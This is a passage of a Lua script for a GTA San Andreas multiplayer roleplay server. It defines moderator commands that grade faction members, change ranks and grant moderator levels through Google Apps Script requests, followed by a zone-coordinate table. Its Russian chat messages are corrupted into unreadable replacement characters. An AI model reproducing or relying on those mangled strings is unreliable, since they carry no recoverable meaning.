		if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ���������� ������� \"��������\" ������ " .. nick .. ".", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� \"��������\" ������ " .. nick .. " ������� �����������.", 0xffff0000) sendtolog("�������� ������� �������� ������ " .. nick .. "", 1) end 
		return
	end)
end

function cmd_mark(sparams) 
	lua_thread.create(function()
		if access.alevel < 2 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
		
		if sparams == "" then 
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /mark [id] [zua/zuo/zz/pmp/rb/uts/no/kp/np/op/total/dopusk] [������ 0-5] ([������� ���������])", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}zua - ������ ������ �����, zuo - ������ ������ ������, zz - ������� ����, pmp - ������ ���. ������", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}rb - ��������������, uts - ��������, no - ��������������, kp - ������/�������", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}np - �������������, op - ������� ����������", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}total - ����� ������(1 - ����/0 - �� ����), dopusk - ������ � ����� (0 - �� �������/1 - �������)", 0xFFFF0000)
			return 
		end
		
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		local id = -1
		local reason = "���"
		if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
		if id == -1 or (id ~= -1 and not sampIsPlayerConnected(tonumber(params[1]))) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
		local nick = sampGetPlayerNickname(tonumber(params[1]))
		if params[2] ~= "zua" and params[2] ~= "zuo" and params[2] ~= "zz" and params[2] ~= "pmp" and params[2] ~= "rb" and params[2] ~= "uts" and params[2] ~= "no" and params[2] ~= "kp" and params[2] ~= "np" and params[2] ~= "op" and params[2] ~= "total"  and params[2] ~= "dopusk" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������� ���������.", 0xFFFF0000) return end
		if (tonumber(params[3]) ~= nil and (((tonumber(params[3]) < 0 or tonumber(params[3]) > 5) and (params[2] ~= "dopusk" and params[2] ~= "total")) or (tonumber(params[3]) ~= 0 and tonumber(params[3]) ~= 1 and (params[2] == "dopusk" or params[2] == "total")))) or (tonumber(params[3]) == nil) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������� ������.", 0xFFFF0000) return end
		if (params[2] == "dopusk") and (tonumber(params[3]) == 0) and params[4] == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������� ���������.", 0xFFFF0000) return else reason = strrest(params, 4) end
			local Members1Text = getMembersText()
			for v in Members1Text:gmatch('[^\n]+') do
				local _, zv, afk = v:match("%[%d+%] %[(%d+)%] " .. nick .. "	(%W*) %[%d+%](.*)")
				if zv ~= nil then
					local reg = regex.new("(.*)\\_(.*)") --
					local fname, sname = reg:match(nick)
					local nickname = "" .. fname .. " " .. sname .. ""
					
					local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=mark&nick=' .. nickname .. '&wto=' .. params[2] .. '&mark=' .. params[3] .. '&reason=' .. translit(reason) .. '&' .. moderpas .. '')
					local re1 = regex.new("@@.@ Update complete @@..@.@") --
					local names = re1:match(responsetext)
					if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ���������� ������ ������ " .. nick .. ".", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ������ " .. nick .. " ������� �����������.", 0xffff0000) end 
					return 
				end
			end

		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nick .. "[" .. id .. "] {FFFAFA}- �� ������ � members", 0xFFFF0000) return
	end)
end

function cmd_change(sparams)
	lua_thread.create(function()
		if access.alevel < 2 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
		if sparams == "" then
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /change [id] [rank] [�������] ([�������� ������� �������])", 0xFFFF0000) 
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}rank: ��������� 1 ����� �������� ���� �� /members, 0 ����� �������� ��� ���������", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������: �����, ������������ ���������� �������, 0 ����� �������� ��� ���������, -1 ����� �������� ����.", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� �������: 0 - �������� ������ ����������, 1 - ������, 2 - ������, 3 - 2-� ��, 4 - 1-� ��, 5 - ��������, 6 - �������", 0xFFFF0000)
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������: /change 123 1 31 1 - ��������� � ������ ������ � id 123, ������� ��� ���� � ���������� 31 �������", 0xFFFF0000)
			return
		end
		
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		local id = -1
		
		if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
		if id == -1 or (id ~= -1 and not sampIsPlayerConnected(tonumber(params[1]))) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
		local nick = sampGetPlayerNickname(tonumber(params[1]))
		if tonumber(params[3]) == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �������� \"�������\".", 0xFFFF0000) return end
		local otm = tonumber(params[3]) == 0 and "none" or tonumber(params[3]) == -1 and "" or params[3]
		local Members1Text = getMembersText()
			for v in Members1Text:gmatch('[^\n]+') do
				local _, zv, afk = v:match("%[%d+%] %[(%d+)%] " .. nick .. "	(%W*) %[%d+%](.*)")
				if zv ~= nil then
					local rank = tonumber(params[2]) == 1 and zv or "����"
					local reg = regex.new("(.*)\\_(.*)") --
					local fname, sname = reg:match(nick)
					local nickname = "" .. fname .. " " .. sname .. ""
					local uptom = params[4]
					
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ����������� �������� ���������� �� ������ {ff0000}" .. nickname .. "{fffafa} � ������� ������.", 0xFFFF0000)
					if tonumber(params[2]) == 1 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� {ff0000}������ �� " .. zv .. ".", 0xFFFF0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ �������� {ff0000}��� ���������.", 0xFFFF0000) end
					if otm == "none" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� �������� {ff0000}��� ���������.", 0xFFFF0000) elseif otm == "" then sampAddChatMessage("{FF0000}[LUA]: {ff0000}�������� ���������� �������.", 0xFFFF0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� {ff0000}���������� ������� �� " .. otm .. ".", 0xFFFF0000) end
					if uptom ~= nil then
						uptom = tonumber(uptom)
						local tarr = {[0] = "�������� ������ ����������", [1] = "��������� � �������� ������", [2] = "��������� �������� ������� �������", [3] = "��������� ������ ������������", [4] = "��������� ������ ������������", [5] = "��������� ����������", [6] = "��������� ���������", [7] = "��������� �������� ��� ���������"}
						if tarr[uptom] ~= nil then sampAddChatMessage("{FF0000}[LUA]: {ff0000}" .. tarr[uptom] .. ".", 0xFFFF0000) else sampAddChatMessage("{FF0000}[LUA]: {ff0000}�� �������� ������� �������.", 0xFFFF0000) end
					end
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� Y ��� ������������� � N ��� ������.", 0xFFFF0000)
					while true do wait(0) if isKeyDown(vkeys.VK_Y) then break end if isKeyDown(vkeys.VK_N) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������.", 0xFFFF0000) return end end
					
					if uptom == 0 then 
						local url = "https://script.google.com/macros/s/AKfycbx28UFg93in4xEHLnLjBPF-3BXRNddlNiiW0RARAZ-hHvu3kwo/exec?do=resetpass&nick=" .. nickname .. "&" .. moderpas .. ""
						local responsetext = req(url)
						local re1 = regex.new("@@.@ Update complete @@..@.@") --
						local names = re1:match(responsetext)
						if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������ ���������� ������ " .. nick .. ".", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ���������� ������ " .. nick .. " ������� �������.", 0xffff0000) end 
						return 
					end
	
					local url = 'https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=update&nick=' .. nickname .. '&rank=' .. (tonumber(params[2]) == 1 and translit(zv) or "none") .. '&hours=' .. otm .. '&' .. (uptom == 1 and "uptom=1" or uptom == 2 and "tren=1" or uptom == nil and "none" or "toruk=" .. (uptom - 2) .. "") .. '&' .. moderpas .. ''
					local responsetext = req(url)
					local re1 = regex.new("@@.@ Update complete @@..@.@") --
					local names = re1:match(responsetext)
					if names == nil then 
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ���������� �� ������ " .. nick .. " � ������� ������.", 0xffff0000) 
					else 
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� �� ������ " .. nick .. " � ������� ������ ������� ���������.", 0xffff0000)
						if uptom == 1 then sampSendChat('/me �������' .. RP .. ' ������� ����-������� ����� "�.�.�.�." ����� ' .. nickname .. '') end
					end 
					return 
				end
			end

		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nick .. "[" .. id .. "] {FFFAFA}- �� ������ � members", 0xFFFF0000) return
	end)
end

function cmd_moder(sparams)
		lua_thread.create(
				function()
						if access.alevel < 5 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /moder [id] [�������]", 0xFFFF0000) return end
						local params = {}
						for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end

						local id = -1
						if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
						if id ~= -1 and not sampIsPlayerConnected(tonumber(params[1])) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
						local nick = id == -1 and params[1] or sampGetPlayerNickname(tonumber(params[1]))

						local level = -1
						if tonumber(params[2]) ~= nil and tonumber(params[2]) >= 0 and tonumber(params[2]) <= 4  then level = tonumber(params[2]) end
						if level == -1 or access.alevel < level then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ������������ ������� �������������.", 0xFFFF0000) return end

						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ����������� ������ ����� ���������� ������ " .. nick .. "", 0xFFFF0000)
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� Y ��� ������������� � N ��� ������.", 0xFFFF0000)
						while true do wait(0) if isKeyDown(vkeys.VK_Y) then break end if isKeyDown(vkeys.VK_N) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������.", 0xFFFF0000) return end end

						local responsetext = req('https://script.google.com/macros/s/AKfycbx28UFg93in4xEHLnLjBPF-3BXRNddlNiiW0RARAZ-hHvu3kwo/exec?do=moder&name=' .. nick .. '&alevel=' .. params[2] .. '&' .. moderpas .. '')
						local re1 = regex.new("@@.@ (Add complete|Alevel changed|Delete complete|Error) @@..@.@") --
						local names = re1:match(responsetext)
						if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����������� ������.", 0xffff0000) return end

						if names == "Add complete" then sendtolog("����� ����� ���������� ������ " .. params[2] .. " ������ " .. nick .. ".", 2) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ " .. nick .. " ���� ������ ����� ����������.", 0xffff0000) return end
						if names == "Alevel changed" then sendtolog("������� ����� ���������� �� ������� " .. params[2] .. " ������ " .. nick .. ".", 2) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������� ������ " .. nick .. " ��� ������� �������.", 0xffff0000) return end
						if names == "Delete complete" then sendtolog("������ ����� ���������� � ������ ������ " .. nick .. ".", 2) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� ���������� � ������ " .. nick .. " ���� ������� �����������.", 0xffff0000) return end
						if names == "Error" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������� ����� ���������� � ������ " .. nick .. ".", 0xffff0000) return end

				end
		)
end



function calculateZone(x, y, z)
    local streets = {{"Restricted Area", -91.586, 1655.050, -50.000, 421.234, 2123.010, 250.000},
	  {"Restricted Area", 117.000000,2091.000000,-500.0,436.000000,2145.000000,500.0},
	  {"Restricted Area", -58.000000,1584.000000,-500,436.000000,1655.000000,500},
	  {"Restricted Area", 83.000000,1570.000000,-500,380.000000,1575.000000,500},
	  {"Restricted Area", 161.000000,1546.000000,-500,409.000000,1664.000000,500},
	  {"Restricted Area", 84.000000,1577.000000,-500,226.000000,1637.000000,500},
	  {"Restricted Area", 376.000000,1695.000000,-500,483.000000,1699.000000,500},
	  {"Restricted Area", 408.000000,1691.000000,-500,518.000000,1775.000000,500},
	  {"Restricted Area", 418.000000,1733.000000,-500,471.000000,2151.000000,500},
	  {"Restricted Area", 476.000000,1746.000000,-500,579.000000,1877.000000,500},
	  {"Restricted Area", 457.000000,1882.000000,-500,597.000000,1993.000000,500},
	  {"Restricted Area", 436.000000,1985.000000,-500,552.000000,2133.000000,500},
		{"Avispa Country Club", -2667.810, -302.135, -28.831, -2646.400, -262.320, 71.169},
    {"Easter Bay Airport", -1315.420, -405.388, 15.406, -1264.400, -209.543, 25.406},
    {"Avispa Country Club", -2550.040, -355.493, 0.000, -2470.040, -318.493, 39.700},
    {"Easter Bay Airport", -1490.330, -209.543, 15.406, -1264.400, -148.388, 25.406},
    {"Garcia", -2395.140, -222.589, -5.3, -2354.090, -204.792, 200.000},
    {"Shady Cabin", -1632.830, -2263.440, -3.0, -1601.330, -2231.790, 200.000},
    {"East Los Santos", 2381.680, -1494.030, -89.084, 2421.030, -1454.350, 110.916},
    {"LVA Freight Depot", 1236.630, 1163.410, -89.084, 1277.050, 1203.280, 110.916},
    {"Blackfield Intersection", 1277.050, 1044.690, -89.084, 1315.350, 1087.630, 110.916},
    {"Avispa Country Club", -2470.040, -355.493, 0.000, -2270.040, -318.493, 46.100},
    {"Temple", 1252.330, -926.999, -89.084, 1357.000, -910.170, 110.916},
    {"Unity Station", 1692.620, -1971.800, -20.492, 1812.620, -1932.800, 79.508},
    {"LVA Freight Depot", 1315.350, 1044.690, -89.084, 1375.600, 1087.630, 110.916},
    {"Los Flores", 2581.730, -1454.350, -89.084, 2632.830, -1393.420, 110.916},
    {"Starfish Casino", 2437.390, 1858.100, -39.084, 2495.090, 1970.850, 60.916},
    {"Easter Bay Chemicals", -1132.820, -787.391, 0.000, -956.476, -768.027, 200.000},
    {"Downtown Los Santos", 1370.850, -1170.870, -89.084, 1463.900, -1130.850, 110.916},
    {"Esplanade East", -1620.300, 1176.520, -4.5, -1580.010, 1274.260, 200.000},
    {"Market Station", 787.461, -1410.930, -34.126, 866.009, -1310.210, 65.874},
    {"Linden Station", 2811.250, 1229.590, -39.594, 2861.250, 1407.590, 60.406},
    {"Montgomery Intersection", 1582.440, 347.457, 0.000, 1664.620, 401.750, 200.000},
    {"Frederick Bridge", 2759.250, 296.501, 0.000, 2774.250, 594.757, 200.000},
    {"Yellow Bell Station", 1377.480, 2600.430, -21.926, 1492.450, 2687.360, 78.074},
    {"Downtown Los Santos", 1507.510, -1385.210, 110.916, 1582.550, -1325.310, 335.916},
    {"Jefferson", 2185.330, -1210.740, -89.084, 2281.450, -1154.590, 110.916},
    {"Mulholland", 1318.130, -910.170, -89.084, 1357.000, -768.027, 110.916},
    {"Avispa Country Club", -2361.510, -417.199, 0.000, -2270.040, -355.493, 200.000},
    {"Jefferson", 1996.910, -1449.670, -89.084, 2056.860, -1350.720, 110.916},
    {"Julius Thruway West", 1236.630, 2142.860, -89.084, 1297.470, 2243.230, 110.916},
    {"Jefferson", 2124.660, -1494.030, -89.084, 2266.210, -1449.670, 110.916},
    {"Julius Thruway North", 1848.400, 2478.490, -89.084, 1938.800, 2553.490, 110.916},
    {"Rodeo", 422.680, -1570.200, -89.084, 466.223, -1406.050, 110.916},
    {"Cranberry Station", -2007.830, 56.306, 0.000, -1922.000, 224.782, 100.000},
    {"Downtown Los Santos", 1391.050, -1026.330, -89.084, 1463.900, -926.999, 110.916},
    {"Redsands West", 1704.590, 2243.230, -89.084, 1777.390, 2342.830, 110.916},
    {"Little Mexico", 1758.900, -1722.260, -89.084, 1812.620, -1577.590, 110.916},
    {"Blackfield Intersection", 1375.600, 823.228, -89.084, 1457.390, 919.447, 110.916},
    {"Los Santos International", 1974.630, -2394.330, -39.084, 2089.000, -2256.590, 60.916},
    {"Beacon Hill", -399.633, -1075.520, -1.489, -319.033, -977.516, 198.511},
    {"Rodeo", 334.503, -1501.950, -89.084, 422.680, -1406.050, 110.916},
    {"Richman", 225.165, -1369.620, -89.084, 334.503, -1292.070, 110.916},
    {"Downtown Los Santos", 1724.760, -1250.900, -89.084, 1812.620, -1150.870, 110.916},
    {"The Strip", 2027.400, 1703.230, -89.084, 2137.400, 1783.230, 110.916},
    {"Downtown Los Santos", 1378.330, -1130.850, -89.084, 1463.900, -1026.330, 110.916},
    {"Blackfield Intersection", 1197.390, 1044.690, -89.084, 1277.050, 1163.390, 110.916},
    {"Conference Center", 1073.220, -1842.270, -89.084, 1323.900, -1804.210, 110.916},
    {"Montgomery", 1451.400, 347.457, -6.1, 1582.440, 420.802, 200.000},
    {"Foster Valley", -2270.040, -430.276, -1.2, -2178.690, -324.114, 200.000},
    {"Blackfield Chapel", 1325.600, 596.349, -89.084, 1375.600, 795.010, 110.916},
    {"Los Santos International", 2051.630, -2597.260, -39.084, 2152.450, -2394.330, 60.916},
    {"Mulholland", 1096.470, -910.170, -89.084, 1169.130, -768.027, 110.916},
    {"Yellow Bell Gol Course", 1457.460, 2723.230, -89.084, 1534.560, 2863.230, 110.916},
    {"The Strip", 2027.400, 1783.230, -89.084, 2162.390, 1863.230, 110.916},
    {"Jefferson", 2056.860, -1210.740, -89.084, 2185.330, -1126.320, 110.916},
    {"Mulholland", 952.604, -937.184, -89.084, 1096.470, -860.619, 110.916},
    {"Aldea Malvada", -1372.140, 2498.520, 0.000, -1277.590, 2615.350, 200.000},
    {"Las Colinas", 2126.860, -1126.320, -89.084, 2185.330, -934.489, 110.916},
    {"Las Colinas", 1994.330, -1100.820, -89.084, 2056.860, -920.815, 110.916},
    {"Richman", 647.557, -954.662, -89.084, 768.694, -860.619, 110.916},
    {"LVA Freight Depot", 1277.050, 1087.630, -89.084, 1375.600, 1203.280, 110.916},
    {"Julius Thruway North", 1377.390, 2433.230, -89.084, 1534.560, 2507.230, 110.916},
    {"Willowfield", 2201.820, -2095.000, -89.084, 2324.000, -1989.900, 110.916},
    {"Julius Thruway North", 1704.590, 2342.830, -89.084, 1848.400, 2433.230, 110.916},
    {"Temple", 1252.330, -1130.850, -89.084, 1378.330, -1026.330, 110.916},
    {"Little Mexico", 1701.900, -1842.270, -89.084, 1812.620, -1722.260, 110.916},
    {"Queens", -2411.220, 373.539, 0.000, -2253.540, 458.411, 200.000},
    {"Las Venturas Airport", 1515.810, 1586.400, -12.500, 1729.950, 1714.560, 87.500},
    {"Richman", 225.165, -1292.070, -89.084, 466.223, -1235.070, 110.916},
    {"Temple", 1252.330, -1026.330, -89.084, 1391.050, -926.999, 110.916},
    {"East Los Santos", 2266.260, -1494.030, -89.084, 2381.680, -1372.040, 110.916},
    {"Julius Thruway East", 2623.180, 943.235, -89.084, 2749.900, 1055.960, 110.916},
    {"Willowfield", 2541.700, -1941.400, -89.084, 2703.580, -1852.870, 110.916},
    {"Las Colinas", 2056.860, -1126.320, -89.084, 2126.860, -920.815, 110.916},
    {"Julius Thruway East", 2625.160, 2202.760, -89.084, 2685.160, 2442.550, 110.916},
    {"Rodeo", 225.165, -1501.950, -89.084, 334.503, -1369.620, 110.916},
    {"Las Brujas", -365.167, 2123.010, -3.0, -208.570, 2217.680, 200.000},
    {"Julius Thruway East", 2536.430, 2442.550, -89.084, 2685.160, 2542.550, 110.916},
    {"Rodeo", 334.503, -1406.050, -89.084, 466.223, -1292.070, 110.916},
    {"Vinewood", 647.557, -1227.280, -89.084, 787.461, -1118.280, 110.916},
    {"Rodeo", 422.680, -1684.650, -89.084, 558.099, -1570.200, 110.916},
    {"Julius Thruway North", 2498.210, 2542.550, -89.084, 2685.160, 2626.550, 110.916},
    {"Downtown Los Santos", 1724.760, -1430.870, -89.084, 1812.620, -1250.900, 110.916},
    {"Rodeo", 225.165, -1684.650, -89.084, 312.803, -1501.950, 110.916},
    {"Jefferson", 2056.860, -1449.670, -89.084, 2266.210, -1372.040, 110.916},
    {"Hampton Barns", 603.035, 264.312, 0.000, 761.994, 366.572, 200.000},
    {"Temple", 1096.470, -1130.840, -89.084, 1252.330, -1026.330, 110.916},
    {"Kincaid Bridge", -1087.930, 855.370, -89.084, -961.950, 986.281, 110.916},
    {"Verona Beach", 1046.150, -1722.260, -89.084, 1161.520, -1577.590, 110.916},
    {"Commerce", 1323.900, -1722.260, -89.084, 1440.900, -1577.590, 110.916},
    {"Mulholland", 1357.000, -926.999, -89.084, 1463.900, -768.027, 110.916},
    {"Rodeo", 466.223, -1570.200, -89.084, 558.099, -1385.070, 110.916},
    {"Mulholland", 911.802, -860.619, -89.084, 1096.470, -768.027, 110.916},
    {"Mulholland", 768.694, -954.662, -89.084, 952.604, -860.619, 110.916},
    {"Julius Thruway South", 2377.390, 788.894, -89.084, 2537.390, 897.901, 110.916},
    {"Idlewood", 1812.620, -1852.870, -89.084, 1971.660, -1742.310, 110.916},
    {"Ocean Docks", 2089.000, -2394.330, -89.084, 2201.820, -2235.840, 110.916},
    {"Commerce", 1370.850, -1577.590, -89.084, 1463.900, -1384.950, 110.916},
    {"Julius Thruway North", 2121.400, 2508.230, -89.084, 2237.400, 2663.170, 110.916},
    {"Temple", 1096.470, -1026.330, -89.084, 1252.330, -910.170, 110.916},
    {"Glen Park", 1812.620, -1449.670, -89.084, 1996.910, -1350.720, 110.916},
    {"Easter Bay Airport", -1242.980, -50.096, 0.000, -1213.910, 578.396, 200.000},
    {"Martin Bridge", -222.179, 293.324, 0.000, -122.126, 476.465, 200.000},
    {"The Strip", 2106.700, 1863.230, -89.084, 2162.390, 2202.760, 110.916},
    {"Willowfield", 2541.700, -2059.230, -89.084, 2703.580, -1941.400, 110.916},
    {"Marina", 807.922, -1577.590, -89.084, 926.922, -1416.250, 110.916},
    {"Las Venturas Airport", 1457.370, 1143.210, -89.084, 1777.400, 1203.280, 110.916},
    {"Idlewood", 1812.620, -1742.310, -89.084, 1951.660, -1602.310, 110.916},
    {"Esplanade East", -1580.010, 1025.980, -6.1, -1499.890, 1274.260, 200.000},
    {"Downtown Los Santos", 1370.850, -1384.950, -89.084, 1463.900, -1170.870, 110.916},
    {"The Mako Span", 1664.620, 401.750, 0.000, 1785.140, 567.203, 200.000},
    {"Rodeo", 312.803, -1684.650, -89.084, 422.680, -1501.950, 110.916},
    {"Pershing Square", 1440.900, -1722.260, -89.084, 1583.500, -1577.590, 110.916},
    {"Mulholland", 687.802, -860.619, -89.084, 911.802, -768.027, 110.916},
    {"Gant Bridge", -2741.070, 1490.470, -6.1, -2616.400, 1659.680, 200.000},
    {"Las Colinas", 2185.330, -1154.590, -89.084, 2281.450, -934.489, 110.916},
    {"Mulholland", 1169.130, -910.170, -89.084, 1318.130, -768.027, 110.916},
    {"Julius Thruway North", 1938.800, 2508.230, -89.084, 2121.400, 2624.230, 110.916},
    {"Commerce", 1667.960, -1577.590, -89.084, 1812.620, -1430.870, 110.916},
    {"Rodeo", 72.648, -1544.170, -89.084, 225.165, -1404.970, 110.916},
    {"Roca Escalante", 2536.430, 2202.760, -89.084, 2625.160, 2442.550, 110.916},
    {"Rodeo", 72.648, -1684.650, -89.084, 225.165, -1544.170, 110.916},
    {"Market", 952.663, -1310.210, -89.084, 1072.660, -1130.850, 110.916},
    {"Las Colinas", 2632.740, -1135.040, -89.084, 2747.740, -945.035, 110.916},
    {"Mulholland", 861.085, -674.885, -89.084, 1156.550, -600.896, 110.916},
    {"King's", -2253.540, 373.539, -9.1, -1993.280, 458.411, 200.000},
    {"Redsands East", 1848.400, 2342.830, -89.084, 2011.940, 2478.490, 110.916},
    {"Downtown", -1580.010, 744.267, -6.1, -1499.890, 1025.980, 200.000},
    {"Conference Center", 1046.150, -1804.210, -89.084, 1323.900, -1722.260, 110.916},
    {"Richman", 647.557, -1118.280, -89.084, 787.461, -954.662, 110.916},
    {"Ocean Flats", -2994.490, 277.411, -9.1, -2867.850, 458.411, 200.000},
    {"Greenglass College", 964.391, 930.890, -89.084, 1166.530, 1044.690, 110.916},
    {"Glen Park", 1812.620, -1100.820, -89.084, 1994.330, -973.380, 110.916},
    {"LVA Freight Depot", 1375.600, 919.447, -89.084, 1457.370, 1203.280, 110.916},
    {"Regular Tom", -405.770, 1712.860, -3.0, -276.719, 1892.750, 200.000},
    {"Verona Beach", 1161.520, -1722.260, -89.084, 1323.900, -1577.590, 110.916},
    {"East Los Santos", 2281.450, -1372.040, -89.084, 2381.680, -1135.040, 110.916},
    {"Caligula's Palace", 2137.400, 1703.230, -89.084, 2437.390, 1783.230, 110.916},
    {"Idlewood", 1951.660, -1742.310, -89.084, 2124.660, -1602.310, 110.916},
    {"Pilgrim", 2624.400, 1383.230, -89.084, 2685.160, 1783.230, 110.916},
    {"Idlewood", 2124.660, -1742.310, -89.084, 2222.560, -1494.030, 110.916},
    {"Queens", -2533.040, 458.411, 0.000, -2329.310, 578.396, 200.000},
    {"Downtown", -1871.720, 1176.420, -4.5, -1620.300, 1274.260, 200.000},
    {"Commerce", 1583.500, -1722.260, -89.084, 1758.900, -1577.590, 110.916},
    {"East Los Santos", 2381.680, -1454.350, -89.084, 2462.130, -1135.040, 110.916},
    {"Marina", 647.712, -1577.590, -89.084, 807.922, -1416.250, 110.916},
    {"Richman", 72.648, -1404.970, -89.084, 225.165, -1235.070, 110.916},
    {"Vinewood", 647.712, -1416.250, -89.084, 787.461, -1227.280, 110.916},
    {"East Los Santos", 2222.560, -1628.530, -89.084, 2421.030, -1494.030, 110.916},
    {"Rodeo", 558.099, -1684.650, -89.084, 647.522, -1384.930, 110.916},
    {"Easter Tunnel", -1709.710, -833.034, -1.5, -1446.010, -730.118, 200.000},
    {"Rodeo", 466.223, -1385.070, -89.084, 647.522, -1235.070, 110.916},
    {"Redsands East", 1817.390, 2202.760, -89.084, 2011.940, 2342.830, 110.916},
    {"The Clown's Pocket", 2162.390, 1783.230, -89.084, 2437.390, 1883.230, 110.916},
    {"Idlewood", 1971.660, -1852.870, -89.084, 2222.560, -1742.310, 110.916},
    {"Montgomery Intersection", 1546.650, 208.164, 0.000, 1745.830, 347.457, 200.000},
    {"Willowfield", 2089.000, -2235.840, -89.084, 2201.820, -1989.900, 110.916},
    {"Temple", 952.663, -1130.840, -89.084, 1096.470, -937.184, 110.916},
    {"Prickle Pine", 1848.400, 2553.490, -89.084, 1938.800, 2863.230, 110.916},
    {"Los Santos International", 1400.970, -2669.260, -39.084, 2189.820, -2597.260, 60.916},
    {"Garver Bridge", -1213.910, 950.022, -89.084, -1087.930, 1178.930, 110.916},
    {"Garver Bridge", -1339.890, 828.129, -89.084, -1213.910, 1057.040, 110.916},
    {"Kincaid Bridge", -1339.890, 599.218, -89.084, -1213.910, 828.129, 110.916},
    {"Kincaid Bridge", -1213.910, 721.111, -89.084, -1087.930, 950.022, 110.916},
    {"Verona Beach", 930.221, -2006.780, -89.084, 1073.220, -1804.210, 110.916},
    {"Verdant Bluffs", 1073.220, -2006.780, -89.084, 1249.620, -1842.270, 110.916},
    {"Vinewood", 787.461, -1130.840, -89.084, 952.604, -954.662, 110.916},
    {"Vinewood", 787.461, -1310.210, -89.084, 952.663, -1130.840, 110.916},
    {"Commerce", 1463.900, -1577.590, -89.084, 1667.960, -1430.870, 110.916},
    {"Market", 787.461, -1416.250, -89.084, 1072.660, -1310.210, 110.916},
    {"Rockshore West", 2377.390, 596.349, -89.084, 2537.390, 788.894, 110.916},
    {"Julius Thruway North", 2237.400, 2542.550, -89.084, 2498.210, 2663.170, 110.916},
    {"East Beach", 2632.830, -1668.130, -89.084, 2747.740, -1393.420, 110.916},
    {"Fallow Bridge", 434.341, 366.572, 0.000, 603.035, 555.680, 200.000},
    {"Willowfield", 2089.000, -1989.900, -89.084, 2324.000, -1852.870, 110.916},
    {"Chinatown", -2274.170, 578.396, -7.6, -2078.670, 744.170, 200.000},
    {"El Castillo del Diablo", -208.570, 2337.180, 0.000, 8.430, 2487.180, 200.000},
    {"Ocean Docks", 2324.000, -2145.100, -89.084, 2703.580, -2059.230, 110.916},
    {"Easter Bay Chemicals", -1132.820, -768.027, 0.000, -956.476, -578.118, 200.000},
    {"The Visage", 1817.390, 1703.230, -89.084, 2027.400, 1863.230, 110.916},
    {"Ocean Flats", -2994.490, -430.276, -1.2, -2831.890, -222.589, 200.000},
    {"Richman", 321.356, -860.619, -89.084, 687.802, -768.027, 110.916},
    {"Green Palms", 176.581, 1305.450, -3.0, 338.658, 1520.720, 200.000},
    {"Richman", 321.356, -768.027, -89.084, 700.794, -674.885, 110.916},
